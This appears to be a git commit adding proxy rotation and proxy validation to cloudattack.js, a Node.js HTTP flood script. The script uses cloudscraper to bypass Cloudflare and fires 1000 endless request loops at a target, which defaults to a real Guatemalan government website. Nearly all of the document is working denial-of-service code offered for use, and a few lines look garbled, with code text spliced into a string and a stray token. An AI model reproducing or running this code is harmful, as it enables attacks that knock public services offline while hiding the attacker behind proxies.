95f612b649e7a88f8ab92569f872944f9dfc7210
dcode <donaldov7gmail.,com>
2019-03-26 08:01:41 -0600

    agregado de soporte para proxies, validacion automatica de los proxies antes del ataque

--- cloudattack.js
+++ cloudattack.js
@@ -1,28 +1,43 @@
 'use strict';
-var cloudscraper = require('cloudscraper');
 
+const pLimit = require('p-limit');
+const cloudscraper = require('cloudscraper');
 const args = require('minimist')(process.argv.slice(2));
+const fs = require('fs');
 
-var site=args['attack'];
-var threads=args['threads']
+const site = args['attack'] || "https://www.guatemala.gob.gt";
+const threads = args['threads'] || 1000;
 
-if(typeof site === 'undefined')
-{
-	console.log('Ingresa un url');
-	return;
+let globalProxies = [];
+let useProxy = false;
+
+if (typeof site === 'undefined') {
+  console.log('Ingresa un url');
+  return;
 }
-if (isNaN(threads))
-{
-	console.log('Ingresa un numero para los threads');
-	return;
+if (isNaN(threads)) {
+  console.log('Ingresa un numero para los thr  infiniteThread();eads');
+  return;
 }
 
-let promises = [];
+
+
+function getRandomInt(max) {
+  return Math.floor(Math.random() * Math.floor(max));
+}
 
 function createThread() {
   return new Promise((resolve, reject) => {
     try {
-      cloudscraper.get(site, function (error, response, body) {
+
+      let options = { uri: site };
+
+      if (useProxy) {
+        let index = getRandomInt(globalProxies.length);
+        options.proxy = globalProxies[index];
+        options.tunnel = false;
+      }
+      cloudscraper.get(options, function (error, response, body) {
         if (error) {
           resolve('Error');
         } else {
@@ -35,14 +50,77 @@ function createThread() {
   });
 }
 
-async function infiniteThread() {
-  try {
-    await createThread();
-  } catch (e) {
-  }
-  infiniteThread();
+function createThreadTestProxy(site, proxy) {
+  return new Promise((resolve, reject) => {
+    try {
+      let options = { uri: site };
+
+      if (useProxy) {
+        options.proxy = proxy;
+        options.tunnel = false;
+      }proxy
+      cloudscraper.get(options, function (error, response, body) {
+        if (error) {
+          reject(false);
+        } else {
+          resolve(proxy);
+        }
+      });
+    } catch (e) {
+      reject(false)
+    }
+  });
 }
 
-for (let index = 0; index < threads; index++) {
-  infiniteThread();
+async function infiniteThread() {
+  while (true) {
+    try {
+      await createThread();
+    } catch (e) {
+    }
+  }
 }
+
+async function testProxy() {
+  console.log("testing proxies...");
+  const proxiesText = fs.readFileSync('proxy.txt', 'utf8');
+  const proxies = proxiesText != null && proxiesText.length > 0 ? proxiesText.split('\n') : null;
+
+  if (proxies == null || proxies.length == 0)
+    return [];
+
+  const limit = pLimit(100);
+  let validProxies = [];
+  let promises = [];
+  for (let index = 0; index < proxies.length; index++) {
+    const proxy = 'http://' + proxies[index];
+
+    // try {
+    promises.push(limit(() => createThreadTestProxy(site, proxy)));
+    //   validProxies.push(proxy);
+    //   console.log("works");
+    // } catch (e) {
+    //   console.log("fails");
+    // }
+  }
+
+  let bulk = await Promise.all(promises);
+  validProxies = bulk.filter(result => result);
+  console.log(`${validProxies.length} valid proxies`);
+  return validProxies;
+}
+
+async function start() {
+  const validProxies = await testProxy();
+  if (validProxies.length > 0) {
+    useProxy = true;
+    globalProxies = validProxies;
+  }
+
+  console.log("starting attack");
+  for (let index = 0; index < threads; index++) {
+    infiniteThread();
+  }
+}
+
+start();
